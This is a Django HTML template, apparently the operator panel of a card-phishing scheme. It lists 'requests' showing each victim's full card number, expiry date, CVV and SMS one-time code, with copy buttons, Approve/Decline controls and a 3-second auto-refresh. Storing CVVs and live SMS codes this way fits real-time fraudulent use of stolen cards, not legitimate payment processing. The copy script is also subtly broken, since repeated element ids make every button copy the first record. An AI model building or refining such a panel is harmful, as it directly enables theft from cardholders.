
{% extends 'base.html' %}
{% block title %}Список заявок{% endblock %}
{% load static %}

{% block content %}

<style>
.img-thumbnail {
    height: 25px;
    width: 40px;
    display: flex;
    margin-left: 5px;
}
</style>
<div class="container-fluid">
<div class="row">
    {% for payment in page_obj %}
    <div class="col-3">
        <div class="row">
             <button class="btn btn-info btn-sm">Approve</button>
        </div>
        <div class="row">
             № {{ payment.counter }}
        </div>
        <div class="row" id="amount">
             {{ payment.amount }}<img class="img-thumbnail" onclick="CopyToClipboard('amount')"  src="{% static '/img/copy2.png' %}">
        </div>
        <div class="row" id="card_number">
             {{ payment.card_number }}<img class="img-thumbnail" onclick="CopyToClipboard('card_number')"  src="{% static '/img/copy2.png' %}">
        </div>
        <div class="row" id="expired_month">
            {% if payment.expired_month < 10 %}0{%  endif %}{{ payment.expired_month }}/{{ payment.expired_year }}<img class="img-thumbnail" onclick="CopyToClipboard('expired_month')"  src="{% static '/img/copy2.png' %}">
        </div>
        <div class="row" id="cvv">
             {{ payment.cvv }}<img class="img-thumbnail" onclick="CopyToClipboard('cvv')"  src="{% static '/img/copy2.png' %}">
        </div>
        <div class="row" id="sms_code">
             {{ payment.sms_code|default_if_none:"" }}<img class="img-thumbnail" onclick="CopyToClipboard('sms_code')"  src="{% static '/img/copy2.png' %}">
        </div>
        <div class="row">
             <button class="btn btn-danger btn-sm">Decline</button>
        </div>
    </div>
    {% endfor %}
</div>
</div>
<script>
function CopyToClipboard(containerid) {
    if (window.getSelection) {
        if (window.getSelection().empty) { // Chrome
            window.getSelection().empty();
        } else if (window.getSelection().removeAllRanges) { // Firefox
            window.getSelection().removeAllRanges();
        }
    } else if (document.selection) { // IE?
        document.selection.empty();
    }

    if (document.selection) {
        var range = document.body.createTextRange();
        range.moveToElementText(document.getElementById(containerid));
        range.select().createTextRange();
        document.execCommand("copy");
    } else if (window.getSelection) {
        var range = document.createRange();
        range.selectNode(document.getElementById(containerid));
        window.getSelection().addRange(range);
        document.execCommand("copy");
    }
}
</script>


    {% include 'includes/refresh_3sec.html' %}


{% endblock %}

